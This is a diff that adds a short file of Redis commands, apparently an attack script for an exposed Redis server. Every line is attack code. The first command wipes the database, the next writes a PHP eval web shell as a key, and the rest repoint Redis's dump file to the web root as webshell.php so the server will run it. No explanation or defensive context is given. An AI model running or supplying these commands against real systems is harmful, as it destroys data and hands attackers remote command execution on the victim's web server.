@@ -1,0 +1,5 @@
+flushall    #清空数据库
+set 1 '<?php @eval($_POST[cmd]);?>'
+config set dir /var/www/html
+config set dbfilename webshell.php
+save
